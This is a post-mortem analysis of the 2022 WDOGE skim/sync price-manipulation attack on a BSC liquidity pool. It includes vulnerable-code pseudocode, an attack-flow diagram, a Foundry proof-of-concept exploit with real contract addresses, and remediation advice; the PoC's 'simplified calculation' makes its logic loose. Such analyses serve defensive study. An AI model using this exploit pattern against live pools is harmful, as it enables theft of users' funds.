# WDOGE — skim/sync Price Manipulation Attack Analysis

| Field | Details |
|------|------|
| **Date** | 2022-04-09 |
| **Protocol** | WDOGE (Wrapped DOGE on BSC) |
| **Chain** | BSC (Binance Smart Chain) |
| **Loss** | ~$2,900 WBNB or more (exact amount undisclosed) |
| **Attacker** | Attacker address unconfirmed |
| **Attack Tx** | Block 17,248,705 |
| **Vulnerable Contract** | WDOGE/WBNB Pair [0xB3e708a6d1221ed7C58B88622FDBeE2c03e4DB4d](https://bscscan.com/address/0xB3e708a6d1221ed7C58B88622FDBeE2c03e4DB4d) |
| **Root Cause** | A flaw in the WDOGE token contract's internal transfer logic allows manipulation of the WDOGE/WBNB LP pool's price ratio by combining `skim()` and `sync()` |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2022-04/Wdoge_exp.sol) |

---
## 1. Vulnerability Overview

WDOGE is a token that wraps Dogecoin on BSC. The attacker exploited the `skim()` and `sync()` mechanisms of a Uniswap V2-style AMM.

`skim(to)`: If the actual token balance exceeds the reserve, transfers the surplus to `to`
`sync()`: Force-synchronizes the reserve to the current actual balance

Due to a flaw in WDOGE's transfer logic, transferring tokens into the pool caused internal state inconsistencies. The attacker repeatedly cycled through `transfer → skim → sync` to manipulate the reserve ratio and extract WBNB as profit.

---
## 2. Vulnerable Code Analysis

```solidity
// skim/sync mechanism explanation (Uniswap V2 based)
contract UniswapV2Pair {
    uint112 private reserve0;
    uint112 private reserve1;

    // ❌ skim: transfers surplus when actual balance > reserve
    // WDOGE transfer flaw causes actual balance to shift unexpectedly
    function skim(address to) external lock {
        address _token0 = token0;
        address _token1 = token1;
        _safeTransfer(_token0, to, IERC20(_token0).balanceOf(address(this)) - reserve0);
        _safeTransfer(_token1, to, IERC20(_token1).balanceOf(address(this)) - reserve1);
    }

    // sync: force-updates reserve to current balance
    function sync() external lock {
        _update(
            IERC20(token0).balanceOf(address(this)),
            IERC20(token1).balanceOf(address(this)),
            reserve0,
            reserve1
        );
    }
}

// WDOGE token internal transfer bug (pseudocode)
contract WDOGE {
    // ❌ Fee deduction method or rebase logic error on transfer
    // Flaw causes actual transferred amount to differ from pool balance
    function transfer(address to, uint256 amount) external returns (bool) {
        // ❌ After internal processing, actual delivered amount differs from amount
        uint256 actualAmount = amount - _getFee(amount);
        _balances[msg.sender] -= amount;    // ❌ Deducts full amount
        _balances[to] += actualAmount;      // Delivers amount minus fee
        // → When WDOGE is extracted from the pool via skim, the fee difference can be repeatedly extracted
        return true;
    }
}
```

---
### On-Chain Original Code

Source: Bytecode decompiled


**Wdoge_decompiled.sol** — Entry points:
```solidity
// ❌ Root cause: A flaw in the WDOGE token contract's internal transfer logic allows manipulation of the WDOGE/WBNB LP pool's price ratio by combining `skim()` and `sync()`
    function skim(address arg0) external {}  // 0xbc25cf77  // ❌ Vulnerable

    function sync() external {}  // 0xfff6cae9  // ❌ Vulnerable
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
    │
    ├─[1] Flash swap: Borrow 2,900 WBNB (BUSD/WBNB Pair)
    │
    ├─[2] [Inside pancakeCall]
    │       Transfer 2,900 WBNB to WDOGE/WBNB pool
    │
    ├─[3] WDOGE/WBNB Pair.swap(large amount of WDOGE, 0, address(this), "")
    │       Receive WDOGE in exchange for WBNB input
    │
    ├─[4] Transfer received WDOGE back to Pair
    │       ⚡ WDOGE transfer flaw causes balance inconsistency
    │
    ├─[5] Pair.skim(address(this))
    │       Actual balance > reserve → collect surplus
    │
    ├─[6] Pair.sync()
    │       Update reserve to new balance
    │       → Price ratio altered
    │
    ├─[7] Repeat or realize profit via WBNB swap
    │
    └─[8] Repay flash swap: 2,908 WBNB
            Net profit: ~(actual received - 2,908) WBNB
```

---
## 4. PoC Code (Core Logic + Comments)

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;

import "forge-std/Test.sol";

interface IPancakePair {
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
    function skim(address to) external;
    function sync() external;
    function getReserves() external view returns (uint112, uint112, uint32);
}

contract ContractTest is Test {
    IERC20 WBNB = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
    IERC20 BUSD = IERC20(0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56);
    IERC20 WDOGE = IERC20(0x46bA8a59f4863Bd20a066Fd985B163235425B5F9);

    IPancakePair wdogeWbnbPair = IPancakePair(0xB3e708a6d1221ed7C58B88622FDBeE2c03e4DB4d);
    IPancakePair busdWbnbPair  = IPancakePair(0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE);

    function setUp() public {
        vm.createSelectFork("bsc", 17_248_705);
    }

    function testExploit() public {
        // [Step 1] Flash swap: borrow 2,900 WBNB
        busdWbnbPair.swap(0, 2_900 ether, address(this), "0x");
        emit log_named_decimal_uint("[Profit] WBNB", WBNB.balanceOf(address(this)), 18);
    }

    function pancakeCall(address, uint256, uint256, bytes calldata) external {
        // [Step 2] Transfer WBNB to WDOGE/WBNB pool
        WBNB.transfer(address(wdogeWbnbPair), WBNB.balanceOf(address(this)));

        // [Step 3] Receive WDOGE (WBNB → WDOGE swap)
        (uint112 reserve0,, ) = wdogeWbnbPair.getReserves();
        uint256 wdogeOut = uint256(reserve0) * 997 / 1000; // Simplified calculation
        wdogeWbnbPair.swap(wdogeOut, 0, address(this), "");

        // [Step 4] Transfer WDOGE back to pool (trigger internal inconsistency)
        WDOGE.transfer(address(wdogeWbnbPair), WDOGE.balanceOf(address(this)));

        // [Step 5] skim: extract surplus WDOGE
        wdogeWbnbPair.skim(address(this));

        // [Step 6] sync: update reserve (price manipulation)
        wdogeWbnbPair.sync();

        // [Step 7] WDOGE → WBNB reverse swap
        WDOGE.transfer(address(wdogeWbnbPair), WDOGE.balanceOf(address(this)));
        wdogeWbnbPair.swap(0, 2_908 ether, address(this), "");

        // [Step 8] Repay flash swap
        WBNB.transfer(address(busdWbnbPair), 2_908 ether);
    }
}
```

---
## 5. Vulnerability Classification (Table)

| Category | Details |
|------|-----------|
| **Vulnerability Type** | AMM Reserve Manipulation (skim/sync Manipulation) |
| **CWE** | CWE-682: Incorrect Calculation |
| **OWASP DeFi** | Deflationary/Fee-on-transfer Token + AMM Inconsistency |
| **Attack Vector** | WDOGE transfer flaw + skim/sync combination |
| **Precondition** | Internal balance inconsistency occurs on WDOGE transfer |
| **Impact** | WBNB drained from WDOGE/WBNB pool |

---
## 6. Remediation Recommendations

1. **AMM support for fee-on-transfer tokens**: When adding fee-bearing tokens to an AMM, verify the actual received amount (`balanceAfter - balanceBefore`).
2. **Restrict the skim function**: Add access control to prevent ordinary users from calling skim.
3. **Reserve discrepancy detection**: Block transactions when a large reserve discrepancy occurs.
4. **Token transfer validation**: Compare balances before and after transfer and use the actual received amount.

---
## 7. Lessons Learned

- **AMM compatibility of deflationary tokens**: Tokens with fees or rebase logic are incompatible with standard AMMs, creating vulnerabilities.
- **Risks of skim/sync**: Uniswap V2's skim/sync are emergency recovery functions, but when combined with flawed tokens they become attack tools.
- **BSC token ecosystem**: BSC hosts a wide variety of non-standard tokens, making AMM compatibility issues a frequent attack surface.